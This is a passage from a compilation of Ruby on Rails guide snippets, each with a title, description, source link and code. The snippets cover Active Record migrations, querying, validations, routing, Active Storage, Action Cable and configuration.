policy.gyroscope   :none\n  policy.microphone  :none\n  policy.usb         :none\n  policy.fullscreen  :self\n  policy.payment     :self, \"https://secure.example.com\"\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Join Table Migration for has_and_belongs_to_many in Rails\nDESCRIPTION: Demonstrates how to create a migration for a join table needed by a has_and_belongs_to_many association. This example creates the assemblies_parts table without a primary key, adding appropriate indexes for performance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_97\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateAssembliesPartsJoinTable < ActiveRecord::Migration[8.1]\n  def change\n    create_table :assemblies_parts, id: false do |t|\n      t.bigint :assembly_id\n      t.bigint :part_id\n    end\n\n    add_index :assemblies_parts, :assembly_id\n    add_index :assemblies_parts, :part_id\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Permitting Nested Attributes in Rails\nDESCRIPTION: This snippet illustrates how to permit nested attributes in Rails controllers, specifically for use with `accepts_nested_attributes_for`. It includes the `id` and `_destroy` attributes for managing associated records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n# permit :id and :_destroy\nparams.expect(author: [ :name, books_attributes: [[ :title, :id, :_destroy ]] ])\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of first with limit\nDESCRIPTION: This SQL query shows the equivalent SQL command for the `Customer.first(3)` method in Rails. It selects all columns from the `customers` table, orders the results by the `id` column in ascending order, and limits the result to 3 records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_21\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.id ASC LIMIT 3\n```\n\n----------------------------------------\n\nTITLE: Testing Active Storage Attachments in Ruby\nDESCRIPTION: Example test case demonstrating how to access and verify Active Storage attachments in tests, checking if the avatar is attached, can be downloaded, and has the expected byte size.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserTest < ActiveSupport::TestCase\n  def test_avatar\n    avatar = users(:david).avatar\n\n    assert avatar.attached?\n    assert_not_nil avatar.download\n    assert_equal 1000, avatar.byte_size\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding File Attachments to Emails\nDESCRIPTION: Examples of adding attachments to emails using Action Mailer, including basic and advanced attachment configurations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nattachments[\"filename.jpg\"] = File.read(\"/path/to/filename.jpg\")\n\nencoded_content = SpecialEncode(File.read(\"/path/to/filename.jpg\"))\nattachments[\"filename.jpg\"] = {\n  mime_type: \"application/gzip\",\n  encoding: \"SpecialEncoding\",\n  content: encoded_content\n}\n```\n\n----------------------------------------\n\nTITLE: Reordering Books Associated with an Author (Ruby)\nDESCRIPTION: This code snippet demonstrates how to use the `reorder` method to override the default ordering of books associated with an author, specifying a new ordering based on `year_published` in ascending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_115\n\nLANGUAGE: ruby\nCODE:\n```\nAuthor.find(10).books.reorder(\"year_published ASC\")\n```\n\n----------------------------------------\n\nTITLE: Defining Default Parameters in a Route - Ruby\nDESCRIPTION: This snippet defines a default value for the `format` parameter in the route. If the incoming request doesn't specify a format, `params[:format]` will be set to `jpg`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nget \"photos/:id\", to: \"photos#show\", defaults: { format: \"jpg\" }\n```\n\n----------------------------------------\n\nTITLE: Deleting Multiple Records with Callbacks in Ruby\nDESCRIPTION: Demonstrates deleting multiple records using Active Record methods that trigger callbacks. `destroy_by` finds and destroys records matching the given conditions, while `destroy_all` removes all records from the table. Both methods instantiate records before deletion, ensuring callbacks are run for each.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n# Find and delete all books by Douglas Adams.\nBook.destroy_by(author: \"Douglas Adams\")\n\n# Delete all books.\nBook.destroy_all\n```\n\n----------------------------------------\n\nTITLE: Defining Namespaced Classes in Rails 6 Zeitwerk Mode\nDESCRIPTION: This Ruby code demonstrates the correct way to define namespaced classes in Rails 6 using Zeitwerk mode, which now matches Ruby semantics for autoloading.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\n# Autoloading in this class' body matches Ruby semantics now.\nclass Admin::UsersController < ApplicationController\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Collection Route with `:on` option - Ruby\nDESCRIPTION: This snippet shows a more concise way to add a collection route using the `:on` option. It achieves the same result as the previous example but with less code. The generated route is `/photos/search`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nresources :photos do\n  get \"search\", on: :collection\nend\n```\n\n----------------------------------------\n\nTITLE: Resetting Sessions in Rails to Prevent Session Fixation\nDESCRIPTION: A simple method to reset the session identifier after authentication, which is a key countermeasure against session fixation attacks. This forces the creation of a new session and invalidates the old one.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nreset_session\n```\n\n----------------------------------------\n\nTITLE: DRYing Up Form Layouts with Partials and Yield\nDESCRIPTION: This code demonstrates how to use `yield` with a partial to DRY up form layout definitions. It passes a form object to the partial, which then yields to render the specific form fields.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_72\n\nLANGUAGE: html\nCODE:\n```\n<%= render \"application/search_filters\", search: @q do |form| %>\n  <p>\n    Name contains: <%= form.text_field :name_contains %>\n  </p>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Database Connection Pool in database.yml\nDESCRIPTION: This snippet demonstrates how to configure the database connection pool settings in the `database.yml` file for a Rails application.  It sets the adapter to sqlite3, specifies the database file, sets the pool size to 5, and sets the connection timeout to 5000 milliseconds.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_111\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: sqlite3\n  database: storage/development.sqlite3\n  pool: 5\n  timeout: 5000\n```\n\n----------------------------------------\n\nTITLE: Add Ingress Password to Credentials\nDESCRIPTION: This snippet shows how to add ingress password to the `action_mailbox.ingress_password` in encrypted credentials using `bin/rails credentials:edit`\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\naction_mailbox:\n  ingress_password: ...\n```\n\n----------------------------------------\n\nTITLE: Underscoring Strings\nDESCRIPTION: Demonstrates the `underscore` method which converts camel case strings to underscored strings. It also converts '::' to '/' and handles strings starting with lowercase characters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\n\"Product\".underscore   # => \"product\"\n\"AdminUser\".underscore # => \"admin_user\"\n\n\"Backoffice::Session\".underscore # => \"backoffice/session\"\n\n\"visualEffect\".underscore # => \"visual_effect\"\n```\n\n----------------------------------------\n\nTITLE: Demonstrating errors.size Method in Ruby on Rails\nDESCRIPTION: This snippet shows how to use the errors.size method to get the total number of errors for a model object after validation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :name, presence: true, length: { minimum: 3 }\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\nirb> person.valid?\n=> false\nirb> person.errors.size\n=> 2\n\nirb> person = Person.new(name: \"Andrea\", email: \"andrea@example.com\")\nirb> person.valid?\n=> true\nirb> person.errors.size\n=> 0\n```\n\n----------------------------------------\n\nTITLE: Inferring Locale from Accept-Language Header in Ruby on Rails\nDESCRIPTION: Extracts the preferred locale from the Accept-Language HTTP header. This implementation is basic and may need to be more robust for production use.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\ndef switch_locale(&action)\n  logger.debug \"* Accept-Language: #{request.env['HTTP_ACCEPT_LANGUAGE']}\"\n  locale = extract_locale_from_accept_language_header\n  logger.debug \"* Locale set to '#{locale}'\"\n  I18n.with_locale(locale, &action)\nend\n\nprivate\n  def extract_locale_from_accept_language_header\n    request.env[\"HTTP_ACCEPT_LANGUAGE\"].scan(/^[a-z]{2}/).first\n  end\n```\n\n----------------------------------------\n\nTITLE: Handling Exceptions in Active Job with rescue_from (Ruby)\nDESCRIPTION: This snippet demonstrates how to handle exceptions raised during job execution using the `rescue_from` method. In this example, `ActiveRecord::RecordNotFound` exceptions are caught within the `GuestsCleanupJob`, allowing for custom error handling logic.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nclass GuestsCleanupJob < ApplicationJob\n  queue_as :default\n\n  rescue_from(ActiveRecord::RecordNotFound) do |exception|\n    # Do something with the exception\n  end\n\n  def perform\n    # Do something later\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a job with a custom parent class\nDESCRIPTION: This command demonstrates generating a job that inherits from a custom abstract class specified using the `--parent` option. This allows for organizing jobs based on a common parent class other than the default ApplicationJob.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate job process_payment --parent=payment_job\n```\n\n----------------------------------------\n\nTITLE: Generating a System Test Skeleton (Bash)\nDESCRIPTION: This command uses the Rails generator to create a new system test file for articles. It is similar to scaffolding but creates a minimal test setup.  This provides a basic file structure to begin writing tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_66\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate system_test articles\n```\n\n----------------------------------------\n\nTITLE: Routing Parameters Example in Rails\nDESCRIPTION: Illustrates how to define a route in `routes.rb` that captures a parameter (`:status`) and makes it available in the `params` hash within the controller action. It also shows how to pass static parameters in routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nget \"/clients/:status\", to: \"clients#index\", foo: \"bar\"\n```\n\n----------------------------------------\n\nTITLE: Changing a Column Default Value\nDESCRIPTION: This snippet shows how to change the default value of a column using the `change_column_default` method.  The default value of the `:approved` field in the `products` table is changed from `true` to `false`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nchange_column_default :products, :approved, from: true, to: false\n```\n\n----------------------------------------\n\nTITLE: Configuring Cookie Serializer for Rails\nDESCRIPTION: Configuration example for setting up JSON-based cookie serialization and handling date/time serialization in cookies\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.action_dispatch.cookies_serializer = :hybrid\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass CookiesController < ApplicationController\n  def set_cookie\n    cookies.encrypted[:expiration_date] = Date.tomorrow # => Thu, 20 Mar 2014\n    redirect_to action: \"read_cookie\"\n  end\n\n  def read_cookie\n    cookies.encrypted[:expiration_date] # => \"2014-03-20\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a Scope with Conditionals in Rails\nDESCRIPTION: Demonstrates defining a scope with a conditional statement. This is useful for applying the scope's conditions only when certain criteria are met.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_164\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  scope :created_before, ->(time) { where(created_at: ...time) if time.present? }\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Reference to Products Table (Ruby)\nDESCRIPTION: This migration adds a `user_id` foreign key column to the `products` table, referencing the `users` table. It also adds an index on the `user_id` column and configures the foreign key constraint.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_15\n\nLANGUAGE: Ruby\nCODE:\n```\nclass AddUserRefToProducts < ActiveRecord::Migration[8.1]\n  def change\n    add_reference :products, :user, null: false, foreign_key: true\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Custom Validation Contexts in Ruby on Rails\nDESCRIPTION: Shows how to define and use custom validation contexts. The example defines an :account_setup context and demonstrates how to trigger validations for this context.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\nclass Person < ApplicationRecord\n  validates :email, uniqueness: true, on: :account_setup\n  validates :age, numericality: true, on: :account_setup\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new(age: 'thirty-three')\nirb> person.valid?\n=> true\nirb> person.valid?(:account_setup)\n=> false\nirb> person.errors.messages\n=> {:email=>[\"has already been taken\"], :age=>[\"is not a number\"]}\n```\n\n----------------------------------------\n\nTITLE: SQL Equivalent of Active Record Update Operation\nDESCRIPTION: Displays the generated SQL `UPDATE` statement corresponding to the `book.update` call. It updates the 'title' and automatically sets the 'updated_at' timestamp for the specific book identified by its 'id', using parameterized values for security and efficiency.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_14\n\nLANGUAGE: sql\nCODE:\n```\n/* Note that `updated_at` is automatically set. */\n\n UPDATE \"books\" SET \"title\" = ?, \"updated_at\" = ? WHERE \"books\".\"id\" = ?  [[\"title\", \"The Lord of the Rings: The Fellowship of the Ring\"], [\"updated_at\", \"2024-02-22 20:51:13.487064\"], [\"id\", 104]]\n```\n\n----------------------------------------\n\nTITLE: Adding a Featured Image to the Product Model - Ruby\nDESCRIPTION: This code adds a `featured_image` attachment to the Product model using Active Storage.  It uses `has_one_attached` to create the association and allows for uploading a single featured image for each product.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_83\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  has_one_attached :featured_image\n  has_rich_text :description\n  validates :name, presence: true\nend\n```\n\n----------------------------------------\n\nTITLE: SQLite3 Extension Configuration (YAML)\nDESCRIPTION: This YAML snippet shows how to configure SQLite3 extensions in the development environment. It uses the `extensions` key to load SQLite extensions by module name, filesystem path, or Ruby code that returns a path. This is useful for adding extra features to SQLite3.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_87\n\nLANGUAGE: YAML\nCODE:\n```\ndevelopment:\n  adapter: sqlite3\n  extensions:\n    - SQLean::UUID                     # module name responding to `.to_path`\n    - .sqlpkg/nalgeon/crypto/crypto.so # or a filesystem path\n    - <%= AppExtensions.location %>    # or ruby code returning a path\n```\n\n----------------------------------------\n\nTITLE: Custom Schema Versions Formatter in Ruby\nDESCRIPTION: This code snippet demonstrates how to create a custom schema versions formatter class to alter the way schema versions are formatted when dumping the database schema. The `CustomSchemaVersionsFormatter` class overrides the `format` method to sort versions and generate a special SQL insert statement. Assigning the new class to `config.active_record.schema_versions_formatter` will replace the default formatter used by the schema dumper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nclass CustomSchemaVersionsFormatter\n  def initialize(connection)\n    @connection = connection\n  end\n\n  def format(versions)\n    # Special sorting of versions to reduce the likelihood of conflicts.\n    sorted_versions = versions.sort { |a, b| b.to_s.reverse <=> a.to_s.reverse }\n\n    sql = +\"INSERT INTO schema_migrations (version) VALUES\\n\"\n    sql << sorted_versions.map { |v| \"(#{@connection.quote(v)})\" }.join(\",\\n\")\n    sql << \";\"\n    sql\n  end\nend\n\nconfig.active_record.schema_versions_formatter = CustomSchemaVersionsFormatter\n```\n\n----------------------------------------\n\nTITLE: Disabling Prepared Statements and Advisory Locks in PostgreSQL (YAML)\nDESCRIPTION: This YAML snippet shows how to disable prepared statements and advisory locks in a PostgreSQL database configuration for a Rails production environment. This might be necessary when using an external connection pooler like PgBouncer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_91\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  adapter: postgresql\n  prepared_statements: false\n  advisory_locks: false\n```\n\n----------------------------------------\n\nTITLE: Creating Table with Index Option (Ruby)\nDESCRIPTION: This code demonstrates how to create indexes directly within the `create_table` block using the `index: true` option or a hash for more complex configurations. This example includes a simple index on the `name` column and a unique index with a custom name on the `email` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_35\n\nLANGUAGE: Ruby\nCODE:\n```\ncreate_table :users do |t|\n  t.string :name, index: true\n  t.string :email, index: { unique: true, name: \"unique_emails\" }\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Web Notifications Channel (Client)\nDESCRIPTION: This JavaScript code defines the client-side logic for a `WebNotificationsChannel`. It subscribes to the channel and, upon receiving data, creates a new web notification with the title and body from the received data. This assumes the client has already requested permission to send web notifications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_24\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app/javascript/channels/web_notifications_channel.js\n// Client-side which assumes you've already requested\n// the right to send web notifications.\nimport consumer from \"./consumer\"\n\nconsumer.subscriptions.create(\"WebNotificationsChannel\", {\n  received(data) {\n    new Notification(data[\"title\"], { body: data[\"body\"] })\n  }\n})\n```\n\n----------------------------------------\n\nTITLE: Rails Initializer Example - Ruby\nDESCRIPTION: This code snippet illustrates how to use the `initializer` method from `Rails::Railtie` to define a custom initializer. This example sets the `helpers_path` for Action Controller.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_110\n\nLANGUAGE: ruby\nCODE:\n```\ninitializer \"action_controller.set_helpers_path\" do |app|\n  ActionController::Helpers.helpers_path = app.helpers_paths\nend\n```\n\n----------------------------------------\n\nTITLE: Wrapping Objects in Array (Ruby)\nDESCRIPTION: This snippet demonstrates the `Array.wrap` method, which wraps its argument in an array unless it's already an array (or array-like). It shows the behavior for `nil`, an existing array, and a single object. It also highlights the difference between `Array.wrap` and `Kernel#Array` when handling objects that respond to `to_ary`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_127\n\nLANGUAGE: ruby\nCODE:\n```\nArray.wrap(nil)       # => []\nArray.wrap([1, 2, 3]) # => [1, 2, 3]\nArray.wrap(0)         # => [0]\n```\n\nLANGUAGE: ruby\nCODE:\n```\nArray.wrap(foo: :bar) # => [{:foo=>:bar}]\nArray(foo: :bar)      # => [[:foo, :bar]]\n```\n\n----------------------------------------\n\nTITLE: Redirect on Successful Save - Ruby\nDESCRIPTION: This Ruby snippet shows how to redirect to the newly created product's show action after a successful save operation. It utilizes Active Record's association capabilities to generate the correct path based on the `@product` object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_57\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_to @product\n```\n\n----------------------------------------\n\nTITLE: Find Multiple Customers by Composite IDs\nDESCRIPTION: Finds multiple customers using a composite primary key.  An array of arrays, where each sub-array represents the composite key, is passed to find.  This demonstrates finding multiple records using composite primary keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\n# Find the customers with primary keys [1, 8] and [7, 15].\nirb> customers = Customer.find([[1, 8], [7, 15]]) # OR Customer.find([1, 8], [7, 15])\n=> [#<Customer store_id: 1, id: 8, first_name: \"Pat\">, #<Customer store_id: 7, id: 15, first_name: \"Chris\">]\n```\n\n----------------------------------------\n\nTITLE: Setting Up Inverse Associations with inverse_of\nDESCRIPTION: Demonstrates how to use the :inverse_of option to explicitly define bi-directional associations. This enables Rails to better optimize memory usage by sharing the same instance between both sides of the association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_113\n\nLANGUAGE: ruby\nCODE:\n```\nclass Supplier < ApplicationRecord\n  has_one :account, inverse_of: :supplier\nend\n\nclass Account < ApplicationRecord\n  belongs_to :supplier, inverse_of: :account\nend\n```\n\n----------------------------------------\n\nTITLE: SQL query for specific data from multiple tables\nDESCRIPTION: This SQL query is generated by the Active Record query. It selects the book ID and title from the `books` table and the author's first name from the `authors` table, joining them on the `author_id` and filtering the results to return only the record where the book title matches 'Abstraction and Specification in Program Development'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_184\n\nLANGUAGE: sql\nCODE:\n```\nSELECT books.id, books.title, authors.first_name\nFROM books\nINNER JOIN authors\n  ON authors.id = books.author_id\nWHERE books.title = $1 [[\"title\", \"Abstraction and Specification in Program Development\"]] LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Example Debugger Session Output (debug gem)\nDESCRIPTION: Displays the typical console output when a `debugger` breakpoint is hit in a Rails application using the `debug` gem. It shows the current source file and line number (`=> 7| debugger`), a truncated backtrace indicating the call stack, and the debugger prompt `(rdbg)` ready for commands.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_15\n\nLANGUAGE: text\nCODE:\n```\nProcessing by PostsController#index as HTML\n[2, 11] in ~/projects/rails-guide-example/app/controllers/posts_controller.rb\n     2|   before_action :set_post, only: %i[ show edit update destroy ]\n     3|\n     4|   # GET /posts or /posts.json\n     5|   def index\n     6|     @posts = Post.all\n=>   7|     debugger\n     8|   end\n     9|\n    10|   # GET /posts/1 or /posts/1.json\n    11|   def show\n=>#0    PostsController#index at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:7\n  #1    ActionController::BasicImplicitRender#send_action(method=\"index\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/action_controller/metal/basic_implicit_render.rb:6\n  # and 72 frames (use `bt' command for all frames)\n(rdbg)\n```\n\n----------------------------------------\n\nTITLE: Generating Picture Tags with picture_tag Helper in Ruby\nDESCRIPTION: Demonstrates the `picture_tag` helper from Action View's AssetTagHelper. This Ruby code generates an HTML `<picture>` tag with nested `<source>` elements for different image formats (WebP and PNG in this case) and a fallback `<img>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\npicture_tag(\"icon.webp\", \"icon.png\")\n```\n\n----------------------------------------\n\nTITLE: Adding Middleware to API-Only Rails App - Ruby\nDESCRIPTION: Demonstrates adding the Rack::MethodOverride middleware to a Rails API-only application. Place this in the application configuration to support HTTP verb emulation, cookies, or flash, depending on your needs.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.use Rack::MethodOverride\n```\n\n----------------------------------------\n\nTITLE: Enabling Public File Server in Ruby on Rails\nDESCRIPTION: Controls whether static files are served from the public directory using the config.public_file_server.enabled option in Rails configuration.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.public_file_server.enabled\n```\n\n----------------------------------------\n\nTITLE: Manual Switching to Replica Role for Queries - ActiveRecord - Ruby\nDESCRIPTION: This example demonstrates how to manually switch database connections to the :reading (replica) role for all code executed within the block using 'ActiveRecord::Base.connected_to'. Dependencies are Rails with properly configured database roles via 'connects_to'. Key parameter is ':role', and all block queries will use the corresponding replica connection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Base.connected_to(role: :reading) do\n  # All code in this block will be connected to the reading role.\nend\n```\n\n----------------------------------------\n\nTITLE: Making a JSON POST Request from JavaScript Client - JS Fetch Example\nDESCRIPTION: Sends a POST request with JSON-encoded parameters using Fetch API from JavaScript, specifying Content-Type as application/json. Used to interact with a Rails API controller expecting JSON input via ActionDispatch::Request. The input is a nested person object, and the output is the JSON-parsed server response.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_15\n\nLANGUAGE: js\nCODE:\n```\nfetch('/people', {\n  method: 'POST',\n  headers: { 'Content-Type': 'application/json' },\n  body: JSON.stringify({ person: { firstName: 'Yehuda', lastName: 'Katz' } })\n}).then(response => response.json())\n```\n\n----------------------------------------\n\nTITLE: Creating Database Tables for Authors and Books with Associations in Ruby on Rails\nDESCRIPTION: This migration creates tables for authors and books, using the belongs_to method to set up the association in the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_9\n\nLANGUAGE: Ruby\nCODE:\n```\nclass CreateBooks < ActiveRecord::Migration[8.1]\n  def change\n    create_table :authors do |t|\n      t.string :name\n      t.timestamps\n    end\n\n    create_table :books do |t|\n      t.belongs_to :author\n      t.datetime :published_at\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Update Callbacks in Rails ActiveRecord\nDESCRIPTION: Demonstrates the use of before_update, around_update, and after_update callbacks in a Rails ActiveRecord model. These callbacks are triggered when an existing record is updated in the database, allowing for custom logic to be executed at different stages of the update process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ApplicationRecord\n  before_update :check_role_change\n  around_update :log_updating\n  after_update :send_update_email\n\n  private\n    def check_role_change\n      if role_changed?\n        Rails.logger.info(\"User role changed to #{role}\")\n      end\n    end\n\n    def log_updating\n      Rails.logger.info(\"Updating user with email: #{email}\")\n      yield\n      Rails.logger.info(\"User updated with email: #{email}\")\n    end\n\n    def send_update_email\n      UserMailer.update_email(self).deliver_later\n      Rails.logger.info(\"Update email sent to: #{email}\")\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding a Reference with Foreign Key\nDESCRIPTION: This snippet adds a reference with the foreign key constraint using the `foreign_key: true` option with `add_reference`.  It creates a `role_id` column in the `users` table referencing the `roles` table and adds a foreign key constraint.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\nadd_reference :users, :role, foreign_key: true\n```\n\n----------------------------------------\n\nTITLE: Defining Resource Routes in Rails\nDESCRIPTION: This Ruby code snippet utilizes the `resources` method to define all the standard CRUD routes for the `products` resource. This single line replaces the multiple individual route definitions shown previously.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_39\n\nLANGUAGE: ruby\nCODE:\n```\nresources :products\n```\n\n----------------------------------------\n\nTITLE: Inserting middleware before another in Rails\nDESCRIPTION: Demonstrates inserting a custom middleware (`Magical::Unicorns`) before another existing middleware (`Rack::Head`) in the Rails middleware stack using `config.middleware.insert_before`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.middleware.insert_before Rack::Head, Magical::Unicorns\n```\n\n----------------------------------------\n\nTITLE: Basic Bi-directional Association Setup\nDESCRIPTION: Example showing a standard bi-directional association between Author and Book models that Rails can automatically identify. This allows for optimized queries and consistent data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_104\n\nLANGUAGE: ruby\nCODE:\n```\nclass Author < ApplicationRecord\n  has_many :books\nend\n\nclass Book < ApplicationRecord\n  belongs_to :author\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Web Notifications Channel (Server)\nDESCRIPTION: This Ruby code defines the server-side logic for a `WebNotificationsChannel`. It creates a stream for the `current_user`, allowing broadcasts to be sent directly to that user's channel. This establishes a mechanism for the server to push notifications to specific clients.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_23\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/web_notifications_channel.rb\nclass WebNotificationsChannel < ApplicationCable::Channel\n  def subscribed\n    stream_for current_user\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Modern Rails Validation Syntax\nDESCRIPTION: Shows the modern concise validation syntax recommended in Rails applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nvalidates :name, presence: true\n```\n\n----------------------------------------\n\nTITLE: Demonstrating ActiveModel::API Features\nDESCRIPTION: This snippet demonstrates the functionalities provided by `ActiveModel::API` such as attribute assignment, conversion to a model, naming, translation, and validations. It showcases how to create an instance of the `EmailContact` class, assign values to its attributes, and validate the object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nirb> email_contact = EmailContact.new(name: \"David\", email: \"david@example.com\", message: \"Hello World\")\n\nirb> email_contact.name # Attribute Assignment\n=> \"David\"\n\nirb> email_contact.to_model == email_contact # Conversion\n=> true\n\nirb> email_contact.model_name.name # Naming\n=> \"EmailContact\"\n\nirb> EmailContact.human_attribute_name(\"name\") # Translation if the locale is set\n=> \"Name\"\n\nirb> 